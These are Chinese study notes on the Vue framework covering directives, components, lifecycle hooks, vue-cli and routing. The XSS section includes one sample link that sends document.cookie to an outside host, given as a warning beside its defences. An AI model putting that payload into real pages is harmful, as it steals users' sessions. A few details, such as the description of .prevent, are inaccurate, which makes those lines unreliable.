# 千锋Vue学习笔记

[toc]

## 写在前面

- 封面 | 摘要 | 关键词

  ![首页](https://img-blog.csdnimg.cn/c944cb785bb946898ed1a018ad717104.jpeg)

  千锋Vue学习笔记

  ```
  Vue
  typescript
  李英俊
  前端
  千锋
  ```

- 学习链接

  1. [千锋HTML5前端开发教程1000集](https://www.bilibili.com/video/BV17z4y1D7Yj)：`[P428:P568]+[P971:P981]，共150集`
  2. [千锋教育前端Vue3.0全套视频教程（Kerwin2023版，Vue.js零基础，Vue3入门到实操）](https://www.bilibili.com/video/BV1Ss4y1T7mZ/)，[用于上述视频的查漏补缺](#vue3)

- 感想 | 摘抄 | 问题

  - vue的架构模式是mvvm（双向绑定）（不是mvc）

  - **箭头函数的this跟外面的this是一样的，如果只是普通的function函数，那么this不再与外面的this相同**

  - 需要计算属性的逻辑，写在 `computed` 中，因为多次使用的话，函数会调用多次，而计算属性只会运行一次。

  - ajax、fetch、xhr是什么关系

    - ajax是异步或局部更新页面的技术
    - xhr是实现ajax的方法，xhr过时了，改成fetch
    - [fetch兼容性不好](https://caniuse.com/?search=fetch)，如果不支持可以用fetch-ie8，实际就是检测浏览器不支持fetch的话，就改为xhr

  - diff算法在判断的时候，如果标签tag不一样，会当机立断直接换掉虚拟dom；如果没有key，且标签一样，则diff算法只会看值是否改变，所以动画就不会更新；如果给同样的div加上不同的key值，则可以让虚拟dom

    - 把树按照层级分解对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/b281090eaede46d7acff0910504907f4.png)
    - 同key值对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/ca008aa2eeac4bd1b910d6a583c48564.png)
    - 同组件对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/43ade5ca82994729984def73645eda45.png)

  - 隐藏：

    - `display: none`：不占位
    - `visibility: hidden`：隐藏内容且占位

  - 连接后面的随机数：强行刷新，不让浏览器拿缓存

  - 善于使用 `v-if` 对应该初始化为null的数据加标签

  - 同一个tag里，动态绑定的 `:class`，和静态绑定的 `class` 会共存；style同理

  - 在es6中合并数组的技巧：

    - 已有数组：`a`
    - 获取新的数组：`b`
    - 合并数组：`a = [...a, ...b]`

  - vue路由history模式怎么解决nginx部署刷新404的问题：[vue路由history模式刷新404问题解决方案](https://blog.csdn.net/weixin_42138029/article/details/116980747)

  - 数组常用函数

    - `filter`：`list.filter(item => item.id !== 3)`，过滤满足条件的项目
    - `splice`：`list.splice(index, 1)`，删除index处的值，且删除一个
    - `reduce`：`list.reduce((total, item) => total + item, 0)`，列表求和，开始值是0，item可以是一个字典，从而实现复杂的求和操作

  - 数组属性：

    - `length`：数组的长度

  - ES6导入导出方式

    1. 第一种

       ```
       export default{
       	createApp: function(){}
       }
       
       import Vue from 'vue'
       Vue.createApp
       ```

    2. 第二种

       ```
       export function createApp(){}
       export {createApp}
       
       import {createApp} from 'vue'
       ```

  - vue-devtools能够检测到，但是没有面板

    - Vue3

      ```js
      // vite.config.js
      export default defineConfig({
        ...
        define: {
          __VUE_PROD_DEVTOOLS__: true,
        },
      })
      ```

    - Vue2

      ```js
      Vue.config.devtools = true
      ```

    - 重启浏览器

  - 箭头函数里的大括号有没有的区别：

    - 有大括号： 需要在括号内加入return才能将内容返回
    - 没有大括号：直接将符合条件的内容返回，不需要加return，但是只支持写一行代码

  - 数据体的解构：

    ```js
    var obj = {name: "ll", age: 100, list: [1, 2, 3]}
    var {list} = obj
    ```
    
  - Vue3中，VCA的生命周期（即setup）跟VOA的生命周期写法有所不同，比如created和beforeCreate都改为了setup等等。

  - 路由细节

    - `$router`：拿到的是路由实例，负责路由的跳转等一系列操作：`$router.push("...")`
    - `$route`：当前匹配到的路由对象，`.params`可以拿到动态路由路径中参数 `/:param`

- <span style="color: skyblue; font-weight: bold">PS：相关工程代码都在 Github 上 </span>

## 1. 前言

1. Vue2是通过 `Object.defineProperty` 拦截变量的get和set方法，来进行监听和更新的

   ```js
   var obj = {}
   Object.defineProperty(obj, "myname", {
       get(){
           console.log("get");
       },
       set(){
           console.log("set");
       }
   })
   ```

2. `Object.defineProperty`有以下缺点：
   
   1. 无法监听es6的Set、Map变化
   2. 无法监听Class类型的数据
   3. 属性的新加或者删除也无法监听
   4. 数组元素的增加和删除也无法监听
   
3. Vue3 使用的是 ES6 的 `Proxy` ，如果浏览器不支持es6那么自动降级为Vue2的方案

   ```js
   var obj = {}
   var vm = new Proxy(obj, {
       get(obj, key){
           console.log("get");
           return obj[key]
       },
       set(obj, key, value){
           console.log("set");
           obj[key] = value
       }
   })
   ```

4. `:src`、`:class`这样的写法的完整写法是：`v-bind:src`

5. 同理，事件 `@click`绑定的完整写法是：`v-on:click`

## 2. 模板语法

1. 插值

   1. 文本：`{{}}`
   2. 纯HTML

      ```
      v-html，放置XSS, CSRF(
      	(1) 前端过滤
      	(2) 后台转义(<> < >)
      	(3) 给cookie加上属性http
      )
      
      <a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
      ```
   3. 表达式

2. 指令：是带有 `v-` 前缀的特殊属性

   - `v-bind`：动态绑定属性

   - `v-if`：动态创建/删除，有更高的**切换**开销
     - `v-else`
     
     - `v-else-if`，可以写多个
     
     - `template v-if`：包装元素template不会被创建，通过这种方式可以让被template包装的内容同生共死
     
       ```html
       <template v-if="isCreated">
       	<div>111</div>
       	<div>222</div>
       </template>
       ```
     
   - `v-show`：动态显示/隐藏，有更高的**初始渲染**开销

   - `v-on:click`：绑定事件

   - `v-for`：遍历/循环【视频2新增下面内容】

     - 可以通过 `v-for="({title, state}, index) in datalist"`的方式，对循环中的对象进行解构
     - v-for 中的 `in` 关键字可以换成 `of`，因为 `of` 更像js的迭代器的感觉
     - **v-for还可以对对象进行遍历**，`v-for="(value, key, index) in itemObj"`，可以拿到三个参数
     - v-for还可以对数字进行range，`v-for="item in 10"` 类似于python的 `for i in range(1, 11)`，需要注意的是，vue是从1开始到值结束，是包含的
     - **注意：** v-for 和 v-if  **不能同时使用**，如果有类似的需求可以先 v-for + template，然后 v-if 

   - `v-model`：双向绑定表单

     - 【多选样例】cc的初始化用数组，这样勾选后会直接把value值加入到数组中，就不用每个checkbox绑定一个v-model的变量了

       ```html
       <input type="checkbox" v-model="cc" value="1" />1
       <input type="checkbox" v-model="cc" value="2" />2
       <input type="checkbox" v-model="cc" value="3" />3
       ```

     - 同样的，全选，就可以把所有的value放到数组中，全不选，就直接复制空数组

     - radio和select（有value用value，没value用option的值）是类似的，只不过用字符串的变量绑定即可，变量的默认值如果是value中的某个值，则前端显示对应的默认值的勾选

3. `v-html`

   - 双大括号会将数据解释为纯文本，而不是HTML。若想插入HTML，需要使用 `v-html` 指令

   - 在网站上动态渲染任意HTML是非常危险的，因为这非常容易造成 **XSS漏洞** ，请仅在内容安全可信时再使用 `v-html` ，并且永远不要使用用户提供的html内容

     ```html
     <!-- htmlTest：有html标签的内容所对应的变量名 -->
     <div v-html="htmlTest"></div>
     ```

4. 缩写

   1. `v-bind:src`：`:src`
   2. `v-on:click`：`@click`

5. 关于vue数据对象新增拦截属性的解决方案

   - vue2：
     - `Vue.set(vm.classobj, "dd", true)`
     - `Vue.set(vm.styleobj, "fontSize", "30px")`
   - vue3: 支持动态增加属性的拦截
   - **动态切换这里可以用对象，也可以用数组，用数组的时候vue两个版本都正常**
   - 注意：如果是直接操作 `:style` 的形式，需要按照js的语法去设置css，即需要用驼峰命名法

6. template是一个包装元素，可以控制子元素的同生共死，同时不会影响dom结构

7. 列表渲染

   1. `v-for`（特殊 v-for=“n in 10”）

      1. in
      2. of

      没有区别
      
   2. key

      1. 跟踪每个节点的身份，从而重用和重新排序现有元素
      2. 理想的key值是每项都有的且唯一的id，data.id
      
   3. 数组更新检测

      1. 使用以下方法操作数组，可以检测变动

         - `push`
         - `pop`
         - `shift`
         - `unshift`
         - `splice`
         - `soft`
         - `reverse`
      2. 新数组替换旧数组【需要将新数组赋值给变量】

         - `filter`：过滤
         - `concat`：拼接
         - `slice`：切片
         - `map`：映射
      3. 不能检测以下变动的数组【vue2不行，vue3可以检测啦】

         ```
         vm.items[indexOfItem] = newValue
         ```

         *解决*：

         - `Vue.set(example1.items, indexOfItem, newValue)`
         - splice
      4. 应用：显示过滤结果
      
   4. 事件处理

      1. 监听事件-直接触发代码
      
      2. 方法事件处理器-写函数名 handleClick
      
      3. **内联处理器方法-执行函数表达式**  `handleClick($event)`，`$event` 事件对象
      
         - 推荐内联函数调用
         - 需要加对事件的引用的话，就直接$加上就行
         - 【内联和方法事件】
           - 内联：只能做简单的逻辑或是一个函数（`f()`）
             - 可以在传入时，传入 `$event` 来传入事件，`f(1, 2, 3, $event)`
             - 使用匿名函数时，可以用类似：`@click="(evt) => handleClick(1, 2, 3, evt)"`
           - 方法事件处理器：`f`，只有一个函数的名字，不是调用
             - 可以接受一个参数，即事件对象
         
      4. 事件修饰符
         - .stop：停止事件【类似`evt.stopPropagation()` 等价于 `@click.stop`
      
           ```html
           <form action="" @submit.prevent="handleSubmit()">
           ```
      
         - .prevent：阻止事件向上冒泡
      
         - .capture：在捕获阶段触发绑定的函数
      
         - .self：只有点击自己的时候才会触发【不接受冒泡触发】
      
         - .once：只能触发一次，触发完之后解除事件绑定了
      
         - .passive：一版用于触摸事件的监听器，可以用来改善移动端设备的滚屏性能
      
      5. 按键修饰符：.enter：`@keyup.enter`，回车触发事件；组合键：`@keyup.ctrl.enter`，
      
           - .esc
      
           - .up
      
           - .down
      
           - .left 
      
           - .right
      
           - .space
      
           - .ctrl
      
           - .shift
      
           - .delete
      
           - **注意，除了这些常用的按键之外，可以直接用类似 `@keyup.65` 键值的属性来模拟对应的按键** 【vue2中才能用键值的方式，vue3中取消了】
      
      6. 【例子】
      
         1. 既可以通过在子dom的click事件中设置 `.stop` 来阻止冒泡
      
            ```html
            <div id="overlay" v-show="isShow" @click.self="isShow=false">
                <div id="center">
                    用户名：<input type="text" />
                    <button @click="isShow=false">登录</button>
                </div>
            </div>
            ```
      
         2. 又可以在父dom的click事件中设置 `.self` 独享事件
      
            ```html
            <div id="overlay" v-show="isShow" @click="isShow=false">
                <div id="center" @click.stop>
                    用户名：<input type="text" />
                    <button @click="isShow=false">登录</button>
                </div>
            </div>
            ```
         
      7. 表单修饰符
      
         1. `.lazy`：在change事件后同步更新而不是input（失去焦点，且内容发生改变）
         2. `.number`：用户输入自动转换为数字
         3. `.trim`：默认自动去除用户输入内容中两端的空格
      
   5. vue 操作dom底层，虚拟dom

      - 本质是js

      - 类似于字典，例如
      
        ```js
        {
        	type: "li",
            text: "aaa",
            children: [...]
        }
        ```
      
      - 按索引标记修改、删除和增加
      
      ![在这里插入图片描述](https://img-blog.csdnimg.cn/2785ead09eab41e688201be7a350a6ae.png)
      
      ![在这里插入图片描述](https://img-blog.csdnimg.cn/3ab4b9b9db954230a111a3118a7ea8f8.png)
      
   6. change和input的区别

      - change只有在输入框失去焦点，且内容发生改变时，才会触发函数

   7. 函数加括号和不加括号的区别

      - 需要传参的时候加括号
      - 如果不加括号：可以**获取事件对象**

        函数增加形参 `evt`，那么 `evt.target` 就是源dom，`evt.target.value` 就是input dom里的值
      - 如果两种参数都需要传递的话，采用该方案：`handleAdd1($event, param_1, param_2, param_3)`

        - 这里的 `$event` 是写死的，不能换其他的变量名
      - 直接写表达式同样可以完成该请求：`count++`

8. 计算属性：

   - **需要return**
   - 很聪明，会缓存，结果会被缓存
   - 依赖修改之后，会重新计算一遍
   - 使用多次的情况下：方法会执行多次，而计算属性只会执行一次
   - 计算属性可写（通过定义set和get），但是大部分情况下是只读的

9. 监听器watch的对比

   - **不需要return**

   - `watch` 选项期望接受一个对象，其中键是需要侦听的响应式

   - 可以拿到修改后的值和修改前的值

   - 通过v-model进行绑定，watch中的同名函数写逻辑

     ```
     <input type="text" v-model="mytext">
     
     watch: {
     	mytext(value, oldValue){...}
     }
     ```

   - 因为computed不能做异步，所以不能发ajax，这里就可以用watch

   - 另一种写法，直接把镜头后的处理逻辑放到methods中

     ```
     watch: {
     	mytext: "anyfunc"
     }
     
     methods: {
     	anyfunc(value, oldValue){
     		...
     	}
     }
     ```

   - 默认情况下，watch是否无法监听对象的

     - （不推荐）可以通过 `.child` 的方式，指定对象里的元素进行监听

     - 通过配置deep，以及将逻辑写到handler中实现，深层次的监听

     - immediate：监听立即触发一次，即默认即触发

       ```
       obj: {
       	handler(value, oldValue){
       		...
       	},
       	deep: true,
       	immediate: true
       }
       ```

10. 一些知识

       - data：状态，被拦截

       - 方法，methods：事件绑定，逻辑计算。可以不用return，没有缓存

       - 计算属性（重视结果），computed：解决模板过重的问题，必须有return，只求结果，有缓存，同步。

       - watch（重视过程）：监听一个值的改变，不用返回值，异步同步。


11. fetch

    - get：

      ```js
      handleFetch() {
          fetch("./json/test.json").then(res => {
              // 状态码，响应头，拿不到真正的数据
              return res.json()
          }).then(res => {
              console.log(res);
          }).catch(err => {
              console.log(err);
          })
      }
      ```
    - post：

      ```js
      // post-1
      handleFetchPost1() {
          fetch("**", {
              method: 'post',
              headers: {
                  "Content-Type": "application/x-www-form-urlencoded"
              },
              body: "name=kerwin&age=100",
          }).then(res => res.json()).then(res => { console.log(res); })
      },
      // post-2
      handlejFetchPost2() {
          fetch("**", {
              method: 'post',
              headers: {
                  'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                  name: 'kervin',
                  age: 100
              })
          }).then(res => res.json()).then(res => { console.log(res); })
      }
      ```
    - 注意：fetch请求默认是不带cookie的，需要设置 `fetch(url, {credentials: 'include'})`

12. axios：非官方的好用的库

    ```js
    handleClick(){
        axios.get("./json/movie.json").then(res=>{
            console.log(res.data.data.films);
            this.dataList = res.data.data.films
        })
    }
    ```

13. 过滤器（管道符）：`|`

    - 把原始数据通过管道送给过滤器进行加工

      ```html
      <img :src="item.img | imgFilter" />
      ```
    - 过滤器的定义

      ```vue
      Vue.filter("imgFilter", (url) => {
      	return url.replace('w.h/', '')+'@1l_1e_1c_128w_180h'
      })
      ```
    - 多个过滤器串行处理：`<img :src="item.img | imgFilter1 | imgFilter2" />`
    - **vue3不支持**

## 3. 组件

1. 组件定义

   - `<swiper></swiper>`
   - Why?：扩展html元素，封装可重用的代码
   - 方案

     - 全局创建组件
     - 局部创建组件
   - 注意：

     1. 起名字：组件名如果用了驼峰写法，在html中需要把大写换成小写，再用-隔开

        ```
        <div id="box">
            <yingjun-navbar></yingjun-navbar>
        </div>
        
        Vue.component("yingjunNavbar"...
        ```
     2. dom 片段没有代码提示，没有高亮显示：**vue单文件组件可以解决**
     3. css 只能写成行内：**vue单文件组件可以解决**
     4. template 包含一个根节点：**不能有兄弟节点**
     5. 组件是孤岛，无法直接访问外面组件的状态或者方法：**间接的组件通信来交流**
     6. 所有的组件都在一起，太乱了：**vue单文件组件可以解决**
2. 全局和局部

   - 父传子：`props: ["变量名"]`
   - 属性验证：改list为dict

     ```
     props: {
         myname: String,
         myright: Boolean
     }
     ```
   - 加上默认值

     ```
     props: {
         myname: {
             type: String,
             default: ""
         },
         myright: {
             type: Boolean,
             default: true
         }
     },
     ```
   - 父传子的理解：data中定义的a，可以传给模板component的**属性**，然后该属性在component的props中定义，这就实现了父类变量->子类变量的映射，从而实现传值，最后在template中使用该值。注意：上述**属性**前记得加 `:`
   - 如果父传子靠**属性**，那么子传父靠的是**事件**

     ![在这里插入图片描述](https://img-blog.csdnimg.cn/e318f3bbf463403a8b22dbe570a43acc.png)
   - bus：中央事件总线，订阅发布模式

     ![在这里插入图片描述](https://img-blog.csdnimg.cn/a893d0f571d04e969c1da9a5c68b798e.png)
   - vuex：状态管理
   - 组件refs

     - ref 绑定dom节点，拿到的就是dom对象
     - ref 绑定组件，拿到的就是 组件对象
   - **属性**：父组件传给你的属性，只有父组件可以重新传，但不允许子组件随意修改
   - **状态**：组件内部的状态，可以随意修改
   - `v-once`：你可能有一个组件，这个组件包含了大量的静态内容，在这种情况下，你可以在根元素上添加 `v-once` attribute以确保这些内容只计算一次然后缓存起来
3. 动态组件

   - 如果没有动态组件，那么在实现页面的时候，需要把所有的组件都写上，用一个变量来控制 v-show

     ```
     <home v-show="which==='home'"></home>
     <list v-show="which==='list'"></list>
     <shopcar v-show="which==='shopcar'"></shopcar>
     ```
   - 有动态组件的时候，一行就可以解决

     ```
     <component :is="which"></component>
     ```
4. slot 插槽|内容分发

   - 扩展组件能力，让组件的封装性、复用性更好
   - 父组件模板的内容在父组件作用域内编译，子组件模板的内容在子组件作用域内编译
   - 获取组件里面的内容放入模板的 slot中

     ```html
     <body>
         <div id="box">
             <child>
                 <div>1111111</div>
                 <div>222222222</div>
             </child>
         </div>
         <script>
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```
   - 具名插槽：`<slot name="a"></slot>`

     ```html
     <body>
         <div id="box">
             <child>
                 <div slot="a">1111111</div>
                 <div slot="b">222222222</div>
                 <div slot="c">33333</div>
                 <div>44444</div>
             </child>
         </div>
         <script>
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot name="a"></slot>
                         <slot name="b"></slot>
                         <slot name="b"></slot>
                         <slot name="c"></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```
   - 新版slot写法 template

     ```vue
     <body>
         <div id="box">
             <navbar>
                 <!-- <button slot="left">aaa</button> -->
                 <template #left>
                     <div>
                         <button>aaa</button>
                     </div>
                 </template>
                 <!-- <i class="iconfont icon-all" slot="right">字体图标</i> -->
                 <template #right>
                     <div>
                         <i class="iconfont icon-all">字体图标</i>
                     </div>
                 </template>
             </navbar>
             <child>
                 <template v-slot:a>
                     <div>
                         1a1a1a
                     </div>
                 </template>
                 <template #b>
                     <div>
                         2b2b2b2
                     </div>
                 </template>
                 <!-- <div slot="a">1111111</div> -->
                 <div slot="b">222222222</div>
                 <div slot="c">33333</div>
                 <div>44444</div>
             </child>
     
         </div>
         <script>
             Vue.component("navbar", {
                 template: `
                     <div>
                         <slot name="left"></slot>
                         <span>navbar</span>
                         <slot name="right"></slot>
                     </div>
     
                 `
             })
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot name="a"></slot>
                         <slot name="b"></slot>
                         <slot name="b"></slot>
                         <slot name="c"></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```
5. 动画过渡

   ```vue
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Document</title>
       <script type="text/javascript" src="lib/vue.js"></script>
       <style>
           /* 进场动画 */
           .yingjun-enter-active {
               animation: aaa 0.5s;
           }
   
           /* 出场动画 */
           .yingjun-leave-active {
               animation: aaa 0.5s reverse;
           }
           @keyframes aaa {
               0% {
                   opacity: 0;
                   transform: translateX(100px);
               }
               100% {
                   opacity: 1;
                   transform: translateX(0px);
               }
           }
       </style>
   </head>
   <body>
       <div id="box">
           <button @click="isShow = !isShow">change</button>
           <!-- 动画入场和离场 -->
           <transition enter-active-class="yingjun-enter-active" leave-active-class="yingjun-leave-active">
               <div v-show="isShow">11111111111</div>
           </transition>
           <!-- 简写 -->
           <transition name="yingjun">
               <div v-show="isShow">11111111111</div>
           </transition>
           <script>
               new Vue({
                   el: "#box",
                   data: {
                       isShow: false
                   }
               })
           </script>
       </div>
   </body>
   </html>
   ```

- 初始添加动画：`<transition name="yingjun" appear>`
- 给每个 li 加动画，需要用到 `transition-group`

  - 需要注意的是，li一定要设置 `:key` 且不能重复
  - `transition-group` 会实例化一个 `span` 标签加在 li 外面，`transition` 不会
  - 支持一个参数 `tag` 用来设置这个标签是什么

    `<transition-group name="yingjun" tag="ul">` ，一般tag设置为 ul 来代替外围的ul
- 可复用过渡：通过把transition封装到组件的方式实现，变量交互为 `:name`，通过设置不同的css 的动画name，在使用时只需要传对应的name，就可以实现对应的css动画

  ```vue
  <sidebar v-show="isShow" mode="yingjun"></sidebar>
  
  Vue.component("sidebar", {
              props:["mode"],
              template: `
              <transition :name="mode">
              <ul style="background-color: yellow; width: 200px; height: 500px;">
                  <li>111--{{mode}}</li>
                  <li>111</li>
                  <li>111</li>
                  <li>111</li>
              </ul>
          	</transition>
  			`
  })
  ```

## 4. 生命周期

1. Vue的生命周期

   ![Vue 实例生命周期](https://v2.cn.vuejs.org/images/lifecycle.png)
2. 创建阶段

   - beforeCreate：没啥用
   - ==created==：在create之后开始创建状态，可以在 `created` 函数中进行 **初始化状态或者挂在到当前实例的一些属性**，可以在这里定义全局变量，这里的全局变量**不可修改**。
   - template：没有的话渲染el中的内容，有的话就会渲染template中的内容
   - beforeMount：还没有替换dom节点，基本没啥用，可以获得解析之前的dom。在模板解析之前最后一次修改模板的节点
   - ==mounted==：拿到真实的dom节点，可能会有一些依赖于dom创建之后，才进行初始化工作的插件，比如 **轮播插件**；订阅 `bus.$on`；**发ajax**

     - 获取数据啊啥的，很关键！就不用点按钮了
3. 更新阶段

   - beforeUpdate：更新之前，可以记录旧的dom，这里可以用来记录进度条的位置啥的
   - updated：更新完成后，获取更新后的dom节点，可以进行swiper轮播的初始化工作，数据更新完，并且已经到DOM中
   - 虚拟dom创建，diff对比：状态立即更新，dom异步更新，也就是说，更新前无法获取页面的dom，**updated** 之后，dom才都成功上树
4. 销毁阶段

   - 销毁前后（`beforeDestroy`、`destroyed`）需要清除定时器、事件解绑等
   - 倒计时的消除，windows函数的消除

     ```js
     clearInterval(this.id)
     window.onresize = null
     ```
5. 面试问题：下列的描述都是问上面8个生命周期

- vue 组件 生命周期
- vue 组件的 钩子函数
- vue组件的生命周期钩子函数

## 5. swiper

1. `list.map(item=>${}`：js 中对数组进行map是映射，把列表中的每一个元素映射成一个字符串
2. swiper的初始化要放到dom插入完成之后，动态生成dom的过程要放到swiper初始化之前
3. 更新是异步的，会导致数据更新了dom没有更新，需要把swiper的初始化放在updated中，而数据更新放在mounted中
4. 上述操作的缺点：

   - 无法复用
   - 修改其他状态，其他状态更新，update会重新运行，`new Swiper`会执行多次，产生bug
5. swiper组件

   1. 给swiper 加一个 `:key` ，值为数组的长度，这样就可以在数组发生变化的时候对swiper进行毁灭和重建，因此为 mounted - destroyed - monted。
   2. 因为数据加载是异步的，那么数据没有加载到的时候，长度就为0，加载完了之后就为2，状态发生了变化。
   3. 更进一步，不用 `:key` ，直接用 `v-if`，也就是说在没数据的时候，不要创建组件，有数据了再说
6. Vue3的组件

   1. 不再通过 `Vue.component` 定义
   2. 需要通过函数的方式调用生成实例，再调用函数的方式生成

      ```js
      var obj = {
          data() {
              return {
                  myname: "kerwin"
              }
          },
          methods: {
      
          },
          computed: {
      
          },
      
      }
      const app = Vue.createApp(obj)
      app.component("navbar", {
          props: ["myname"],
          template: `
                  <div>
                      navbar-{{myname}}
                      <slot></slot>
                  </div>
              `
      })
      app.mount("#box")
      ```
   3. 生命周期名称替换：`destoryed` -> `unmounted`；`beforeDestroy` -> `beforeUnmount`
   4. Vue2中是以类的写法去实现的，Vue3中是以类（>90%是一样的）+hooks（函数）写法去实现的

## 6. 指令

1. 指令的出现：就是为了把一些dom操作封装在指令里面
2. `directives`
3. 生命周期函数

   1. `bind`：类似 `create`。只调用一次，指令第一次绑定到元素的时候调用，在这里可以进行一次性的初始化设置
   2. `inserted`：类似 `mounted`。当前节点 **第一次** 插入到父节点中时调用，仅保证父节点存在，但不一定已经被插入文档中
   3. `update`：类似 `beforeUpdate`。当且节点 更新时 执行，但是可能发生在其子 **VNode** 更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新
   4. `componentUpdated`：类似 `updated`。指令所在组件的VNode及其子 VNode 全部更新后调用
   5. `unbind`：类似 `destroyed`。只调用一次，指令与元素解绑时调用

   ```js
   Vue.directive("hello", {
       // 指令的生命周期函数
       inserted(el, binding){
           console.log("inserted", binding);
           el.style.background = binding.value
       },
       update(el, binding) {
           console.log("update");
           el.style.background = binding.value
       },
   })
   var vm = new Vue({
       el: "#box",
       data: {
           whichColor: 'blue'
       }
   })
   ```
4. 简写方式：将 `{}` 的内容，改为函数

   ```js
   Vue.directive("hello", (el, binding) => {
       console.log("创建更新都会执行");
       el.style.background = binding.value
   })
   var vm = new Vue({
       el: "#box",
       data: {
           whichColor: 'blue'
       }
   })
   ```
5. vue3生命周期改变：

   - `inserted` -> `mounted`，等等
   - 除了没有 `beforeCreate` ，其他的7个生命周期都有
6. nextTick

   - 一个抄近道的方法，不适合用于封装
   - 比updated走的都晚，而且只执行一次
   - 一般在修改的状态后面，触发nextTick

     ```js
     this.$nextTick(() => {
     	console.log("我比updated执行的都晚，而且只执行一次")
     })
     ```

## 7. vue-cli

1. 安装vue的脚手架，一次安装永久使用：`npm i -g @vue/cli`
2. 自定义安装：`vue create 项目名`

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/0936f2b0db8d4d46940600c998b1f166.png)
3. eslint导致的无法运行解决方案：

   1. `npm run lint`
   2. vscode自动修复eslin，安装eslint插件，并启用
   3. 暂时关掉，最后用①统一修复 `(vue.config.js) lintOnSave: false`
4. 整个项目中除了 `main.js` 不可以改，其他的都可以改
5. 模块开发：在哪用，在哪引

   ```js
   import navbar from './components/Navbar'
   import Vue from 'vue'
   ```

   - 全局注册：`Vue.component("navbar", navbar)`
   - 局部注册：冒号可以省略，也不用导入Vue了

     ```js
     components: {
         // navbar: navbar,
         navbar
     }
     ```
6. 局部作用域：`<style lang="scss" scoped>`

   - 如果想局部影响：`scoped`
   - 如果想全局影响：不加
7. 子传父：

   - 子组件 触发器（按钮）绑定点击事件，事件函数中：`this.$emit('event')`
   - `event`事件在html的组件A中定义：`<navbar myname="home" :myright="false" @event="handleEvent">`
   - 然后在函数中管理组件B的对应操作：`<sidebar v-show="isShown"></sidebar>`

     ```js
     handleEvent(){
     	this.isShown = !this.isShown
     }
     ```
8. 生命周期、指令、过滤器

   ```js
   import Vue from "vue";
   
   Vue.directive("hello", {
     inserted(el, binding) {
       console.log(el);
       el.style.border = "1px solid black";
     },
   });
   Vue.filter("imgFilter", (path) => {
     return path.replace("/w.h", "") + "123123asdasd";
   });
   ```

## 8. Vue.config.js

1. 配置反向代理

   ```vue
     devServer: {
       proxy: {
         "/ajax": {
           target: "https://m.maoyan.com",
           changeOrigin: true
         },
   
         // 凡是kerwin请求的，都会拦截之后，进行路径的替换和反向代理
         "/kerwin": {
           target: "https://m.maizuo.com",
           changeOrigin: true,
           pathRewrite: {
             "/kerwin": ''
           }
         },
       }
     }
   ```
2. 别名：`@`，永远指向src的绝对路径，webpack配置的别名，即 `/src`

## 9. 路由

单页面应用：SinglePage Web Application, SPA

多页面应用：MultiPage Web Application, MPA

|                   | 单页面应用                                                               | 多页面应用                                   |
| ----------------- | ------------------------------------------------------------------------ | -------------------------------------------- |
| 组成              | 一个外壳页面和多个页面片段组成                                           | 多个完整页面组成                             |
| 资源共用(css, js) | 公用，只需在外壳部分加载                                                 | 不共用，每个页面都需要加载                   |
| 刷新方式          | 页面局部刷新或更改                                                       | 整页刷新                                     |
| url模式           | a.com/#/1, a.com/#/2                                                     | a.com/1.html, a.com/2.html                   |
| 用户体验          | 页面片段间的切换快，用户体验良好                                         | 页面切换加载缓慢，流畅度不够，用户体验比较差 |
| 转场动画          | 容易实现                                                                 | 无法实现                                     |
| 数据传递          | 容易                                                                     | 依赖url传参，或者cookie，localStorage等      |
| 搜索引擎优化(SEO) | 需要单独方案、实现较为困难、不利于SEO检索，可以利用服务器端渲染(SSR)优化 | 实现方法简易                                 |
| 试用范围          | 高要求的体验度、追求界面流畅的应用                                       | 适用于追求高度支持搜索引擎的应用             |
| 开发成本          | 较高，常需借助专业的框架                                                 | 较低，但页面重复代码多                       |
| 维护成本          | 相对容易                                                                 | 相对复杂                                     |

1. vue-router 配置

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/3f6104ff87e94280bdced127c2a12446.png)
2. 在 `index.js` 中通过设置 **mode: ‘history’** 来取消默认自带的 `/#/`
3. 路由配置：

   ```
   const routes = [
     {
       path: '/films',
       component: Films
     },
   ]
   ```
4. 首页重定向

   ```
   {
       path: '/',
       redirect: '/films'
     }
   ```
5. 任意路径重定向：按顺序匹配，等到了通配符就会直接重定向

   ```
   // 最后一道防线，匹配不到就走这个
   {
       path: '*',
       redirect: '/films'
     }
   ```
6. a 链接跳转方式：不方便设置高亮等
7. `router-link`：**声明式导航**，通过设置 `.router-link-active` 的样式来控制当前选择的导航高亮，同样可以设置自己的 `active-class` 属性以及对应的样式，来控制

   - `to`
   - `active-class`
   - `tag`：当前标签会被tag指定的标签渲染，比如设置为 `li` 这样外面就不用再包裹 li 了

     - 需要注意的是，tag在高版本 `router-link` 中，已经弃用了。替换的，要使用 `custom v-slot`

       ```
       <router-link to="/center" custom v-slot="{ navigate, isActive }">
               <li @click="navigate">我的--{{ isActive }}</li>
       </router-link>
       ```
8. 嵌套路由

   - 在对应的路由下，增加孩子路由

     ```
     {
         path: '/films',
         component: Films,
         children: [
           {
             path: '/films/nowplaying',
             component: NowPlaying
           },
           {
             path: '/films/comingsoon',
             component: ComingSoon
           },
           {
             path: '/films',
             redirect: '/films/nowplaying'
           }
         ]
       },
     ```
   - 对孩子路由中，设置重定向

     ```
     {
             path: '/films',
             redirect: '/films/nowplaying'
     }
     ```
   - **编程式导航**

     - 主要就是通过给tag加点击事件实现

       ```
       <li v-for="data in datalist" :key="data" @click="handleChangePage">
       ```
     - 然后函数里跳转到对应的页面

       ```
       location.href = "#/detail"
       ```
